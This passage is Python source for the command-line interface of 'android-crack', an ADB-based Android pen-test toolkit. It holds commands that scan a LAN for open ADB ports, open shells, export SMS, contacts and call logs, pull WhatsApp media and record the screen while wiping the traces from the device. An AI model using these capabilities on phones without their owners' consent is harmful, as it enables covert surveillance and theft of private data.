from __future__ import annotations

import asyncio
import subprocess as _subprocess
from pathlib import Path

import typer
from rich.panel import Panel
from rich.table import Table

from android_crack.capabilities import apps as cap_apps
from android_crack.capabilities import comms as cap_comms
from android_crack.capabilities import connect as cap_connect
from android_crack.capabilities import device as cap_device
from android_crack.capabilities import diagnostics as cap_diag
from android_crack.capabilities import exploit as cap_exploit
from android_crack.capabilities import exports as cap_exports
from android_crack.capabilities import files as cap_files
from android_crack.capabilities import info as cap_info
from android_crack.capabilities import media as cap_media
from android_crack.capabilities import network as cap_net
from android_crack.capabilities import shell as cap_shell
from android_crack.capabilities import wifi as cap_wifi
from android_crack.core.adb_client import AdbClient, AdbResult
from android_crack.core.audit import AuditLog
from android_crack.core.device_pool import DevicePool
from android_crack.core.settings import Settings
from android_crack.core.tool_finder import locate_tools
from android_crack.ui.banner import console, show_banner, show_disclaimer

app = typer.Typer(
    name="android-crack",
    help="Android pen-test toolkit over ADB and Metasploit-Framework. Authorized testing only.",
    no_args_is_help=True,
    rich_markup_mode="rich",
)


def _require_adb() -> str:
    tools = locate_tools()
    if not tools.adb:
        console.print("[err]adb not found on PATH.[/err] Install Android platform-tools.")
        raise typer.Exit(code=2)
    return tools.adb


def _require_authorized(settings: Settings) -> None:
    if settings.authorized:
        return
    show_disclaimer()
    raise typer.Exit(code=3)


def _new_pool(adb_path: str) -> DevicePool:
    return DevicePool(client=AdbClient(adb_path))


def _resolve_target(settings: Settings, serial: str | None) -> tuple[DevicePool, str]:
    """Verify auth, locate adb, refresh devices, select target. Returns (pool, serial)."""
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    if serial:
        pool.select(serial)
    return pool, pool.require_active()


def _print_result_line(result: object, success_label: str = "ok") -> None:
    text = getattr(result, "text", "") or ""
    err = getattr(result, "stderr", "") or ""
    ok = getattr(result, "ok", False)
    if ok:
        console.print(f"[ok]{text or success_label}[/ok]")
    else:
        console.print(f"[err]{text or err.strip()}[/err]")


@app.callback(invoke_without_command=True)
def root(
    ctx: typer.Context,
    i_have_authorization: bool = typer.Option(
        False,
        "--i-have-authorization",
        help="Confirm you are authorized to test the target devices.",
    ),
    no_banner: bool = typer.Option(False, "--no-banner", help="Suppress startup banner."),
) -> None:
    settings = Settings.load()
    if i_have_authorization and not settings.authorized:
        settings.authorized = True
        settings.ensure_dirs()
        settings.save()
        console.print("[ok]Authorization recorded.[/ok] You can now run any subcommand.")
        raise typer.Exit(code=0)
    ctx.obj = settings
    if ctx.invoked_subcommand is None:
        if not no_banner:
            show_banner()
        if not settings.authorized:
            show_disclaimer()
        else:
            console.print("Run [accent]android-crack --help[/accent] for available commands.")


@app.command("devices")
def devices_cmd(ctx: typer.Context) -> None:
    """List connected ADB devices."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())

    table = Table(title="ADB devices", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("Serial", style="brand")
    table.add_column("State", style="ok")
    table.add_column("Model", style="accent")
    table.add_column("Product", style="muted")

    if not pool.devices:
        console.print("[warn]No devices.[/warn] Connect one and try again.")
        return

    for i, d in enumerate(pool.devices, 1):
        table.add_row(str(i), d.serial, d.state, d.model or "—", d.product or "—")
    console.print(table)


connect_app = typer.Typer(help="Connect / pair targets.")
app.add_typer(connect_app, name="connect")


@connect_app.callback(invoke_without_command=True)
def connect_root(
    ctx: typer.Context,
    target: str | None = typer.Argument(None, help="HOST or HOST:PORT (default port 5555)"),
) -> None:
    """Classic TCP connect (default port 5555)."""
    if ctx.invoked_subcommand:
        return
    if not target:
        console.print("[err]Missing target.[/err] Example: android-crack connect 192.168.1.42")
        raise typer.Exit(code=2)
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    client = AdbClient(adb)

    if ":" in target:
        host, _, port_s = target.partition(":")
        port = int(port_s) if port_s.isdigit() else 5555
    else:
        host, port = target, 5555

    result = asyncio.run(cap_connect.connect_tcp(client, host, port))
    if result.ok and "connected" in result.text.lower():
        console.print(f"[ok]{result.text}[/ok]")
    else:
        console.print(f"[err]{result.text or result.stderr.strip()}[/err]")
        raise typer.Exit(code=1)


@connect_app.command("pair")
def connect_pair(
    ctx: typer.Context,
    target: str = typer.Argument(..., help="HOST:PORT shown by Wireless debugging"),
    code: str = typer.Argument(..., help="6-digit pair code"),
) -> None:
    """Android 11+ wireless debug pairing."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    client = AdbClient(adb)

    if ":" not in target:
        console.print("[err]Target must be HOST:PORT.[/err]")
        raise typer.Exit(code=2)
    host, _, port_s = target.partition(":")
    if not port_s.isdigit():
        console.print("[err]Port must be numeric.[/err]")
        raise typer.Exit(code=2)

    result = asyncio.run(cap_connect.pair_wireless(client, host, int(port_s), code))
    if result.ok:
        console.print(f"[ok]{result.text or 'paired'}[/ok]")
    else:
        console.print(f"[err]{result.text or result.stderr.strip()}[/err]")
        raise typer.Exit(code=1)


@connect_app.command("disconnect")
def connect_disconnect(
    ctx: typer.Context,
    target: str | None = typer.Argument(None, help="HOST:PORT (default: all)"),
) -> None:
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_connect.disconnect(client, target))
    console.print(f"[ok]{result.text}[/ok]" if result.ok else f"[err]{result.text}[/err]")


@app.command("shell")
def shell_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s", help="Target serial"),
    command: str | None = typer.Option(
        None, "--cmd", "-c", help="Run one shell command and exit (non-interactive)."
    ),
) -> None:
    """Interactive ADB shell, or run one shell command with --cmd."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    if serial:
        pool.select(serial)
    target = pool.require_active()

    if command:
        result = asyncio.run(cap_shell.run_command(pool.client, target, command))
        if result.stdout:
            console.print(result.stdout, end="")
        if result.stderr:
            console.print(f"[err]{result.stderr}[/err]", end="")
        raise typer.Exit(code=result.returncode)

    rc = cap_shell.interactive_shell(adb, target)
    raise typer.Exit(code=rc)


@app.command("info")
def info_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s", help="Target serial"),
) -> None:
    """Show device information."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    if serial:
        pool.select(serial)
    target = pool.require_active()

    info = asyncio.run(cap_info.collect_info(pool.client, target))

    table = Table(title=f"Device {target}", header_style="accent")
    table.add_column("Property", style="brand")
    table.add_column("Value", style="ok")
    for key, value in info.__dict__.items():
        if key == "serial":
            continue
        table.add_row(key.replace("_", " ").title(), value or "—")
    console.print(table)


@app.command("screenshot")
def screenshot_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s", help="Target serial"),
    out_dir: Path | None = typer.Option(None, "--out", help="Output directory"),
    anonymous: bool = typer.Option(False, "--anonymous", help="Delete from device after pull"),
) -> None:
    """Capture and pull a screenshot."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    if serial:
        pool.select(serial)
    target = pool.require_active()

    dest_dir = out_dir or settings.captures_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(
            cap_media.screenshot(pool.client, target, dest_dir, anonymous=anonymous)
        )
    except RuntimeError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


@app.command("tui")
def tui_cmd(ctx: typer.Context) -> None:
    """Launch the Textual TUI."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    if not _require_adb():
        raise typer.Exit(code=2)
    from android_crack.ui.tui import run_tui

    run_tui()


@app.command("serve")
def serve_cmd(
    ctx: typer.Context,
    host: str = typer.Option("127.0.0.1", "--host", help="Bind address"),
    port: int = typer.Option(8080, "--port", help="TCP port"),
) -> None:
    """Run the REST API (uvicorn). Needs the 'api' extra installed."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    if not _require_adb():
        raise typer.Exit(code=2)
    try:
        from android_crack.api.server import serve
    except ImportError as e:
        console.print(
            "[err]REST API extras not installed.[/err] "
            "Run: [accent]pip install 'android-crack[api]'[/accent]"
        )
        raise typer.Exit(code=2) from e

    console.print(f"[brand]Android-Crack API[/brand] on http://{host}:{port}")
    serve(host=host, port=port)


# ---------------------------------------------------------------------------
# apps subcommand group
# ---------------------------------------------------------------------------

apps_app = typer.Typer(help="App / package management.")
app.add_typer(apps_app, name="apps")


@apps_app.command("list")
def apps_list(
    ctx: typer.Context,
    kind: str = typer.Option(
        "third_party",
        "--kind",
        "-k",
        help="all | third_party | system",
    ),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """List installed packages."""
    if kind not in {"all", "third_party", "system"}:
        console.print("[err]--kind must be one of: all, third_party, system[/err]")
        raise typer.Exit(code=2)
    pool, target = _resolve_target(ctx.obj, serial)
    packages = asyncio.run(cap_apps.list_packages(pool.client, target, kind))  # type: ignore[arg-type]

    table = Table(title=f"{kind} packages on {target}", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("Package", style="brand")
    for i, pkg in enumerate(packages, 1):
        table.add_row(str(i), pkg.name)
    console.print(table)
    console.print(f"[muted]{len(packages)} package(s)[/muted]")


@apps_app.command("install")
def apps_install(
    ctx: typer.Context,
    apk: Path = typer.Argument(..., exists=True, dir_okay=False, readable=True),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    grant: bool = typer.Option(False, "--grant", help="Grant all runtime permissions (-g)"),
) -> None:
    """Install an APK (`adb install -r`)."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(
        cap_apps.install_apk(pool.client, target, apk, grant_runtime_perms=grant)
    )
    _print_result_line(result, success_label=f"Installed {apk.name}")


@apps_app.command("install-multi")
def apps_install_multi(
    ctx: typer.Context,
    apks: list[Path] = typer.Argument(..., exists=True, dir_okay=False, readable=True),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Install split APKs (`adb install-multiple -r`)."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.install_split_apks(pool.client, target, apks))
    _print_result_line(result, success_label=f"Installed {len(apks)} APKs")


@apps_app.command("uninstall")
def apps_uninstall(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    keep_data: bool = typer.Option(False, "--keep-data"),
) -> None:
    """Uninstall a package."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.uninstall(pool.client, target, package, keep_data=keep_data))
    _print_result_line(result, success_label=f"Uninstalled {package}")


@apps_app.command("launch")
def apps_launch(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Launch an app via the default launcher intent."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.launch(pool.client, target, package))
    _print_result_line(result, success_label=f"Launched {package}")


@apps_app.command("force-stop")
def apps_force_stop(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """`am force-stop` a package."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.force_stop(pool.client, target, package))
    _print_result_line(result, success_label=f"Stopped {package}")


@apps_app.command("clear")
def apps_clear(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
) -> None:
    """Clear all app data (`pm clear`). Destructive."""
    if not yes:
        confirm = typer.confirm(f"Clear ALL data for {package}? Cannot be undone.")
        if not confirm:
            raise typer.Exit(code=0)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.clear_data(pool.client, target, package))
    _print_result_line(result, success_label=f"Cleared {package}")


@apps_app.command("restart")
def apps_restart(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Force-stop then launch the app."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_apps.restart_app(pool.client, target, package))
    _print_result_line(result, success_label=f"Restarted {package}")


@apps_app.command("perm")
def apps_perm(
    ctx: typer.Context,
    action: str = typer.Argument(..., help="grant | revoke"),
    package: str = typer.Argument(...),
    permission: str = typer.Argument(..., help="e.g. android.permission.CAMERA"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Grant or revoke a runtime permission."""
    if action not in {"grant", "revoke"}:
        console.print("[err]action must be 'grant' or 'revoke'[/err]")
        raise typer.Exit(code=2)
    pool, target = _resolve_target(ctx.obj, serial)
    fn = cap_apps.grant_permission if action == "grant" else cap_apps.revoke_permission
    result = asyncio.run(fn(pool.client, target, package, permission))
    _print_result_line(result, success_label=f"{action}ed {permission} for {package}")


@apps_app.command("extract")
def apps_extract(
    ctx: typer.Context,
    package: str = typer.Argument(...),
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Pull the installed base APK to disk."""
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.downloads_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(cap_apps.extract_apk(pool.client, target, package, dest))
    except RuntimeError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


# ---------------------------------------------------------------------------
# files subcommand group
# ---------------------------------------------------------------------------

files_app = typer.Typer(help="Filesystem transfer / browse.")
app.add_typer(files_app, name="files")


@files_app.command("ls")
def files_ls(
    ctx: typer.Context,
    remote: str = typer.Argument("/sdcard/", help="Remote directory path"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """List a remote directory."""
    pool, target = _resolve_target(ctx.obj, serial)
    entries = asyncio.run(cap_files.list_dir(pool.client, target, remote))
    if not entries:
        console.print("[warn]Empty or not a directory.[/warn]")
        return
    table = Table(title=f"{remote} on {target}", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("Name", style="brand")
    table.add_column("Type", style="ok")
    for i, e in enumerate(entries, 1):
        table.add_row(str(i), e.name, "dir" if e.is_dir else "file")
    console.print(table)


@files_app.command("pull")
def files_pull(
    ctx: typer.Context,
    remote: str = typer.Argument(..., help="Remote file or directory"),
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Pull a remote file or directory to local."""
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.downloads_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(cap_files.pull_path(pool.client, target, remote, dest))
    except (FileNotFoundError, RuntimeError) as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


@files_app.command("push")
def files_push(
    ctx: typer.Context,
    local: Path = typer.Argument(..., exists=True, readable=True),
    remote: str = typer.Argument("/sdcard/", help="Remote destination directory"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Push a local file or directory to the device."""
    pool, target = _resolve_target(ctx.obj, serial)
    try:
        result = asyncio.run(cap_files.push_path(pool.client, target, local, remote))
    except FileNotFoundError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    _print_result_line(result, success_label=f"Pushed {local.name} → {remote}")


@files_app.command("bucket")
def files_bucket(
    ctx: typer.Context,
    name: str = typer.Argument(
        ...,
        help="whatsapp | camera | screenshots | downloads | music | movies",
    ),
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Pull a known media folder to local."""
    valid = {"whatsapp", "camera", "screenshots", "downloads", "music", "movies"}
    if name not in valid:
        console.print(f"[err]bucket must be one of: {', '.join(sorted(valid))}[/err]")
        raise typer.Exit(code=2)
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.downloads_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(cap_files.pull_bucket(pool.client, target, name, dest))  # type: ignore[arg-type]
    except (FileNotFoundError, RuntimeError) as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


# ---------------------------------------------------------------------------
# export subcommand group
# ---------------------------------------------------------------------------

export_app = typer.Typer(help="Data exports (SMS, contacts, call log, logcat).")
app.add_typer(export_app, name="export")


def _run_dump(ctx: typer.Context, source: str, serial: str | None, out_dir: Path | None) -> None:
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.downloads_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(cap_exports.dump_source(pool.client, target, source, dest))  # type: ignore[arg-type]
    except RuntimeError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


@export_app.command("sms")
def export_sms(
    ctx: typer.Context,
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Export SMS to a text file."""
    _run_dump(ctx, "sms", serial, out_dir)


@export_app.command("contacts")
def export_contacts(
    ctx: typer.Context,
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Export contacts to a text file."""
    _run_dump(ctx, "contacts", serial, out_dir)


@export_app.command("calls")
def export_calls(
    ctx: typer.Context,
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Export call log to a text file."""
    _run_dump(ctx, "calls", serial, out_dir)


@export_app.command("logcat")
def export_logcat(
    ctx: typer.Context,
    lines: int = typer.Option(500, "--lines", "-n", help="Last N lines"),
    filter_spec: str | None = typer.Option(None, "--filter", help="Logcat filter (e.g. *:W)"),
    out_dir: Path | None = typer.Option(None, "--out"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Save a logcat snippet."""
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.downloads_dir
    settings.ensure_dirs()
    local = asyncio.run(
        cap_exports.save_logcat(pool.client, target, dest, lines=lines, filter_spec=filter_spec)
    )
    console.print(f"[ok]Saved:[/ok] {local}")


# ---------------------------------------------------------------------------
# record subcommand (media phase 1 extension)
# ---------------------------------------------------------------------------

@app.command("record")
def record_cmd(
    ctx: typer.Context,
    seconds: int = typer.Argument(..., help="Recording duration in seconds (1..180)"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    out_dir: Path | None = typer.Option(None, "--out"),
    anonymous: bool = typer.Option(False, "--anonymous"),
) -> None:
    """Screen-record the device for N seconds and pull the MP4."""
    if not 1 <= seconds <= 180:
        console.print("[err]seconds must be 1..180 (Android cap)[/err]")
        raise typer.Exit(code=2)
    settings: Settings = ctx.obj
    pool, target = _resolve_target(settings, serial)
    dest = out_dir or settings.captures_dir
    settings.ensure_dirs()
    try:
        local = asyncio.run(
            cap_media.screen_record(pool.client, target, dest, seconds, anonymous=anonymous)
        )
    except (RuntimeError, ValueError) as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {local}")


# ---------------------------------------------------------------------------
# network subcommand group
# ---------------------------------------------------------------------------

net_app = typer.Typer(help="Network / port-forward / LAN scan.")
app.add_typer(net_app, name="network")

forward_app = typer.Typer(help="adb forward (host ↔ device port tunnels).")
net_app.add_typer(forward_app, name="forward")


@net_app.command("ip")
def net_ip(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Show interfaces, routes, DNS on the device."""
    pool, target = _resolve_target(ctx.obj, serial)
    snap = asyncio.run(cap_net.ip_snapshot(pool.client, target))
    console.print(f"[accent]Interfaces[/accent]\n{snap.ip_addr or '—'}")
    console.print(f"\n[accent]Routes[/accent]\n{snap.routes or '—'}")
    console.print(f"\n[accent]net.dns1[/accent] {snap.dns1 or '—'}")


@net_app.command("ping")
def net_ping(
    ctx: typer.Context,
    host: str = typer.Argument("8.8.8.8"),
    count: int = typer.Option(4, "--count", "-c"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Ping a host from the device."""
    pool, target = _resolve_target(ctx.obj, serial)
    output = asyncio.run(cap_net.ping(pool.client, target, host, count=count))
    console.print(output or "[muted](no output)[/muted]")


@net_app.command("scan")
def net_scan(
    ctx: typer.Context,
    subnet: str | None = typer.Option(
        None,
        "--subnet",
        help="CIDR (default: derive /24 from local IP)",
    ),
) -> None:
    """LAN host discovery + ADB 5555/5554 port probe (nmap)."""
    _require_authorized(ctx.obj)
    tools = locate_tools()
    if not tools.nmap:
        console.print("[err]nmap not found on PATH.[/err]")
        raise typer.Exit(code=2)

    if not subnet:
        ip = cap_net.local_lan_ip()
        if not ip:
            console.print("[err]Could not derive a local IP. Pass --subnet explicitly.[/err]")
            raise typer.Exit(code=2)
        prefix = ".".join(ip.split(".")[:3])
        subnet = f"{prefix}.0/24"

    console.print(f"[muted]Scanning {subnet} ...[/muted]")
    hosts = cap_net.lan_scan(subnet, nmap_path=tools.nmap)
    if not hosts:
        console.print("[warn]No live hosts found.[/warn]")
        return

    table = Table(title=f"Hosts in {subnet}", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("IP", style="brand")
    table.add_column("5555", style="ok")
    table.add_column("5554", style="ok")
    table.add_column("Fingerprint", style="muted")
    for i, h in enumerate(hosts, 1):
        table.add_row(
            str(i),
            h.ip,
            "open" if h.adb_5555_open else "—",
            "open" if h.adb_5554_open else "—",
            h.fingerprint or "—",
        )
    console.print(table)


@forward_app.command("add")
def forward_add(
    ctx: typer.Context,
    local_port: int = typer.Argument(..., help="Host TCP port"),
    remote_port: int = typer.Argument(..., help="Device TCP port"),
) -> None:
    """adb forward tcp:LOCAL tcp:REMOTE."""
    _require_authorized(ctx.obj)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_net.forward_add(client, local_port, remote_port))
    _print_result_line(result, success_label=f"tcp:{local_port} → device tcp:{remote_port}")


@forward_app.command("remove")
def forward_remove(
    ctx: typer.Context,
    spec: str = typer.Argument(..., help="e.g. tcp:8080"),
) -> None:
    _require_authorized(ctx.obj)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_net.forward_remove(client, spec))
    _print_result_line(result, success_label=f"removed {spec}")


@forward_app.command("clear")
def forward_clear(ctx: typer.Context) -> None:
    """Remove all forward rules."""
    _require_authorized(ctx.obj)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_net.forward_remove_all(client))
    _print_result_line(result, success_label="all forward rules removed")


@forward_app.command("list")
def forward_list(ctx: typer.Context) -> None:
    _require_authorized(ctx.obj)
    adb = _require_adb()
    client = AdbClient(adb)
    text = asyncio.run(cap_net.forward_list(client))
    console.print(text or "[muted](no rules)[/muted]")


@net_app.command("reverse")
def net_reverse(
    ctx: typer.Context,
    remote_port: int = typer.Argument(..., help="Device TCP port"),
    local_port: int = typer.Argument(..., help="Host TCP port"),
) -> None:
    """adb reverse tcp:REMOTE tcp:LOCAL."""
    _require_authorized(ctx.obj)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_net.reverse_add(client, remote_port, local_port))
    _print_result_line(result, success_label=f"device tcp:{remote_port} → host tcp:{local_port}")


# ---------------------------------------------------------------------------
# wifi subcommand group
# ---------------------------------------------------------------------------

wifi_app = typer.Typer(help="Wi-Fi status / saved networks / radio toggle.")
app.add_typer(wifi_app, name="wifi")


@wifi_app.command("status")
def wifi_status(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Filtered dumpsys wifi (SSID/BSSID/IP/RSSI/link)."""
    pool, target = _resolve_target(ctx.obj, serial)
    lines = asyncio.run(cap_wifi.wifi_status(pool.client, target))
    if not lines:
        console.print("[warn]No matching wifi status lines.[/warn]")
        return
    console.print("[accent]Wi-Fi status[/accent]")
    for line in lines:
        console.print(f"  {line}")


@wifi_app.command("ip")
def wifi_ip(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Show wlan0 IP."""
    pool, target = _resolve_target(ctx.obj, serial)
    out = asyncio.run(cap_wifi.wlan_ip(pool.client, target))
    console.print(out or "[muted](no output)[/muted]")


@wifi_app.command("enable")
def wifi_enable(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Turn the Wi-Fi radio on (`svc wifi enable`)."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_wifi.wifi_set(pool.client, target, enable=True))
    _print_result_line(result, success_label="wifi enabled")


@wifi_app.command("disable")
def wifi_disable(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Turn the Wi-Fi radio off."""
    if not yes:
        confirm = typer.confirm("Disabling Wi-Fi will drop ADB-over-Wi-Fi. Continue?")
        if not confirm:
            raise typer.Exit(code=0)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_wifi.wifi_set(pool.client, target, enable=False))
    _print_result_line(result, success_label="wifi disabled")


@wifi_app.command("saved")
def wifi_saved(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """List saved Wi-Fi SSIDs (no passwords)."""
    pool, target = _resolve_target(ctx.obj, serial)
    ssids = asyncio.run(cap_wifi.saved_networks(pool.client, target))
    if not ssids:
        console.print(
            "[warn]No saved SSIDs detected. ROMs vary — try `wifi status`.[/warn]"
        )
        return
    table = Table(title="Saved Wi-Fi networks (SSID only)", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("SSID", style="brand")
    for i, s in enumerate(ssids, 1):
        table.add_row(str(i), s)
    console.print(table)


# ---------------------------------------------------------------------------
# diag subcommand group
# ---------------------------------------------------------------------------

diag_app = typer.Typer(help="Diagnostics: locale, root heuristics, dev settings.")
app.add_typer(diag_app, name="diag")

devset_app = typer.Typer(help="Read or write `settings get/put global` keys.")
diag_app.add_typer(devset_app, name="devsettings")


@diag_app.command("battery")
def diag_battery(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Battery summary via dumpsys battery."""
    pool, target = _resolve_target(ctx.obj, serial)
    data = asyncio.run(cap_info.battery(pool.client, target))
    if not data:
        console.print("[warn]No battery info.[/warn]")
        return
    table = Table(title=f"Battery on {target}", header_style="accent")
    table.add_column("Key", style="brand")
    table.add_column("Value", style="ok")
    for k, v in data.items():
        table.add_row(k, v or "—")
    console.print(table)


@diag_app.command("locale")
def diag_locale(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Show locale/language info."""
    pool, target = _resolve_target(ctx.obj, serial)
    locale = asyncio.run(cap_diag.collect_locale(pool.client, target))
    table = Table(title="Locale", header_style="accent")
    table.add_column("Source", style="brand")
    table.add_column("Value", style="ok")
    table.add_row("settings system system_locales", locale.system_locales)
    table.add_row("persist.sys.locale", locale.persist_sys)
    table.add_row("ro.product.locale", locale.ro_product)
    console.print(table)


@diag_app.command("root")
def diag_root(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Heuristic root / Magisk detection."""
    pool, target = _resolve_target(ctx.obj, serial)
    report = asyncio.run(cap_diag.root_check(pool.client, target))

    table = Table(title=f"Root heuristics on {target}", header_style="accent")
    table.add_column("Check", style="brand")
    table.add_column("Result", style="ok")
    for key, value in report.properties.items():
        table.add_row(key, value or "—")
    table.add_row("shell id", report.shell_id or "—")
    table.add_row("which su", report.which_su or "(not found)")
    table.add_row("su /system paths", report.su_paths or "—")
    table.add_row("magisk paths", report.magisk_paths or "—")
    table.add_row("magisk app (pm path)", report.magisk_pkg or "(not installed)")
    console.print(table)
    console.print(f"[accent]Score:[/accent] {report.score} → [brand]{report.verdict}[/brand]")
    if report.reasons:
        for reason in report.reasons:
            console.print(f"  [muted]·[/muted] {reason}")


@diag_app.command("stayon")
def diag_stayon(
    ctx: typer.Context,
    mode: str = typer.Argument(..., help="usb | on | off"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """`svc power stayon` — keep screen on while charging."""
    if mode not in {"usb", "on", "off"}:
        console.print("[err]mode must be: usb, on, off[/err]")
        raise typer.Exit(code=2)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_diag.screen_stay_on(pool.client, target, mode))  # type: ignore[arg-type]
    _print_result_line(result, success_label=f"stayon set to {mode}")


@devset_app.command("get")
def devset_get(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Read curated developer/global settings."""
    pool, target = _resolve_target(ctx.obj, serial)
    data = asyncio.run(cap_diag.developer_settings_read(pool.client, target))
    table = Table(title=f"settings get global ({target})", header_style="accent")
    table.add_column("Key", style="brand")
    table.add_column("Value", style="ok")
    for key, value in data.items():
        table.add_row(key, value or "(unset)")
    console.print(table)


@devset_app.command("set")
def devset_set(
    ctx: typer.Context,
    key: str = typer.Argument(...),
    value: str = typer.Argument(...),
